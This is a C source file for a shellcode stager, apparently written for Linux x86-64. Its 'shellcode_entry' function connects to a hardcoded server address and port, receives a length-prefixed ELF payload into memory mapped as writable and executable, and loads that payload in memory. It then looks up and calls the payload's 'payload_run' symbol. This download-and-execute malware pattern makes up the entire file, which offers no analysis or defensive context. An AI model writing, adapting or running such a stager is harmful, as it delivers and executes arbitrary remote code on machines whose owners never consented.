#include <elf.h>
#include <stdint.h>

extern void* _mmap(void*, uint64_t, int, int);
extern int _strcmp(const char*, const char*);
extern void _memset(void*, int, uint64_t);
extern int _socket(int, int, int);
extern int _connect(int, void*, int);
extern int _recv(int, void*, int, int);
extern long _syscall1(long, long);
extern void* elf_load(char*);

#define SYS_close 3
#define AF_INET 2
#define SOCK_STREAM 1
#define IPPROTO_TCP 6
#define PROT_READ 0x1
#define PROT_WRITE 0x2
#define PROT_EXEC 0x4
#define MAP_PRIVATE 0x02
#define MAP_ANONYMOUS 0x20
#define SERVER_IP 0x0100007F
#define SERVER_PORT 0x5C11

struct _sa
{
    uint16_t family;
    uint16_t port;
    uint32_t addr;
    uint8_t zero[8];
};

void shellcode_entry(void)
{
    int sock = _socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock < 0)
        return;

    struct _sa sa;
    sa.family = AF_INET;
    sa.port = SERVER_PORT;
    sa.addr = SERVER_IP;
    _memset(sa.zero, 0, 8);

    if (_connect(sock, &sa, sizeof(sa)) != 0)
    {
        _syscall1(SYS_close, sock);
        return;
    }

    uint32_t payload_size = 0;
    int got = 0;
    while (got < 4)
    {
        int r = _recv(sock, (char*)&payload_size + got, 4 - got, 0);
        if (r <= 0)
        {
            _syscall1(SYS_close, sock);
            return;
        }

        got += r;
    }
    if (!payload_size || payload_size > 32*1024*1024)
    {
        _syscall1(SYS_close, sock);
        return;
    }

    char* rawBuf = (char*)_mmap(0, payload_size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS);
    if (!rawBuf)
    {
        _syscall1(SYS_close, sock);
        return;
    }

    uint32_t total = 0;
    while (total < payload_size)
    {
        int chunk = _recv(sock, rawBuf + total, payload_size - total, 0);
        if (chunk <= 0)
        {
            _syscall1(SYS_close, sock);
            return;
        }

        total += (uint32_t)chunk;
    }
    _syscall1(SYS_close, sock);

    char* img = (char *)elf_load(rawBuf);
    if (!img)
        return;

    Elf64_Ehdr* eh = (Elf64_Ehdr*)rawBuf;
    Elf64_Phdr* ph = (Elf64_Phdr*)(rawBuf + eh->e_phoff);

    uint64_t min_va = (uint64_t)-1;
    for (int i = 0; i < eh->e_phnum; i++)
    {
        if (ph[i].p_type == 1 && ph[i].p_vaddr < min_va)
        {
            min_va = ph[i].p_vaddr;
        }    
    }

    uint64_t load_bias = (uint64_t)img - min_va;

    Elf64_Shdr* sh = (Elf64_Shdr*)(rawBuf + eh->e_shoff);
    for (int i = 0; i < eh->e_shnum; i++)
    {
        if (sh[i].sh_type != 11)
            continue;

        Elf64_Sym* syms = (Elf64_Sym*)(rawBuf + sh[i].sh_offset);
        int nsym = sh[i].sh_size / sizeof(Elf64_Sym);
        char* strs = rawBuf + sh[sh[i].sh_link].sh_offset;
        for (int j = 1; j < nsym; j++)
        {
            if (!syms[j].st_name)
                continue;

            if (_strcmp(strs + syms[j].st_name, "payload_run") == 0)
            {
                ((void(*)(void))(load_bias + syms[j].st_value))();
                return;
            }
        }
    }
}